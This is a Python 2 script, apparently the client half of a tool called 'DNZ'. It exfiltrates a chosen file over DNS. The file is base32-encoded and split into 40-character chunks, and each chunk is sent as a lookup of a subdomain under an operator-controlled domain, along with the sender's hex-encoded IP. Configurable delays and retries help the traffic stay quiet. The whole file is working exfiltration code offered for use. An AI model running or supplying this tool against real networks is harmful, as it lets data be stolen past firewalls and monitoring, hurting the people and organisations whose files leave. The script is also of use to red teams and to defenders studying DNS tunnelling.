#!/usr/bin/env python
### DNZ client by zalt3es
### URL: https://github.com/zalt3es/dnz
import sys, base64, socket, time

filename = "tryMe.txt"
server = "my.domain.com"
timeToSleep = 0.0
retries=2
fileNr=1

print "-"*25
print "DNZ client, usage:"
print "{0} fileName domain timeToSleep retriesIfNoDNSresponse fileNumberIfMultipleSent\nDefaults:\n".format(sys.argv[0])
print "{0} {1} {2} {3} {4} {5}".format(sys.argv[0],filename,server,timeToSleep,retries,fileNr)
print "-"*25

try:
    filename = sys.argv[1]
    server = sys.argv[2]
    timeToSleep = float(sys.argv[3])
    retries = int(sys.argv[4])
    fileNr = int(sys.argv[5])
except:
    pass

print "Sending {0} to {1} with {2} seconds delay\nretries if DNS not responding:{3}\nfile number (in case you want to send multiple): {4}".format(filename,server,timeToSleep,retries,fileNr)

bfilename = base64.b32encode(filename[-20:]).replace("=","")

def resolve(URL):
    #print URL #uncomment if you want to see what it is doing
    for i in range(0,retries):
        try:
            if timeToSleep != 0.0:
                time.sleep(timeToSleep)
            ip = socket.gethostbyname(URL.replace("=",""))
            if ip=="127.0.0.1":
                return
        except:
            pass

#reading and encoding file as base32
with open(filename, "rb") as f:
    myString=base64.b32encode(f.read())
chunk_size = 40
myArray = []
for i in range(0, len(myString), chunk_size):
    myArray.append(myString[i:i+chunk_size])
#getting current IP
theIp = ""
for i in socket.gethostbyname(socket.gethostname()).split("."):
    theIp += ("{0}".format(hex(int(i))))[2:].zfill(2)

resolve("{0}{1}{2}{3}.{4}".format(theIp,fileNr,str(len(myArray)).zfill(8),bfilename,server))#zfill 8 to have four 0 to indicate the new file
#and here iteraing :)
for i in range(0,len(myArray)):
    print "{2} % Request {0} of {1}".format(i,len(myArray), int(i*100/len(myArray)))
    payload = myArray[i]
    resolve("{0}{1}{4}{2}.{3}".format(theIp,fileNr,payload,server,str(i+1).zfill(4)))
print "Completed"
